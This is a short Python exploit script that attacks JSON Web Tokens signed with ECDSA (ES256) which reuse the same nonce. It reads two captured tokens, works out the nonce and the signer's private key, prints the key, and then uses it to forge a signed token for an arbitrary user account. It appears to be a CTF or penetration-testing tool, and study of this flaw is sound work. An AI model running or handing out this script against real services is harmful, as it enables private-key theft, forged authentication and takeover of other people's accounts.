#!/usr/bin/env python3

"""
author: otter ʕ •ᴥ•ʔ

This script leverages a know vulnerability in Eliptic Curves signature schemes and it calculates
a private key based on a pair of signatures with different messages but the same nonce value, hence
the name of the script
"""

from Crypto.Util.number import *
import base64
import hashlib
from fastecdsa import ecdsa
from fastecdsa.curve import P256
import sys


# parse the JWT token and decode the signature
def auth(token):
    hashed = token.split('.')[0] + '.' + token.split('.')[1]
    signature = token.split('.')[-1]
    raw_signature = base64.b64decode(signature.replace(
        '-', '+').replace('_', '/') + "==").hex()

    return hashed.encode(), int(raw_signature[:64], 16), int(raw_signature[64:], 16)


# calculate the modular inverse of a number with respect to a given modulus
def modinv(number, modulus):
    return pow(number, modulus - 2, modulus)


# setup function for ecc
# perform divison and modulus
def divmod(a, b, modulus):
    return (a * modinv(b, modulus)) % modulus


# the two sample tokens are given as two cli arguments
user1 = sys.argv[1]
user2 = sys.argv[2]

# parse the two tokens
# m1, m1 = hashed message
# r, s1, s2 = signature components
m1, r, s1 = auth(user1)
m2, r, s2 = auth(user2)

# calculate an integer representation of the SHA-256 signature components
order = P256.q
z1 = int(hashlib.sha256(m1).hexdigest(), 16)
z2 = int(hashlib.sha256(m2).hexdigest(), 16)


# perform a modular division with the `order` curve
k = divmod(z1 - z2, s1 - s2, order)

# calculates the private key `d` with the `order` curve
d = divmod(k * s1 - z1, r, order)
print("[+] Private key:", d)

# uses the found private key to craft a new JWT token specific to a user
# the new token is constructed and formatted as a base64-encoded string

# the structure of the string changes from application to application
new_token = b'eyJhbGciOiJFUzI1NiJ9.' + \
    base64.b64encode(
        b'{"username":"finalUser","email":"finalUser@company.com","account_status":true}')
new_token = new_token.replace(b"=", b"")
r, s = ecdsa.sign(new_token, d)

new_token += b"." + base64.b64encode(long_to_bytes(r) + long_to_bytes(
    s)).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')

print("[+] JWT:", new_token.decode())
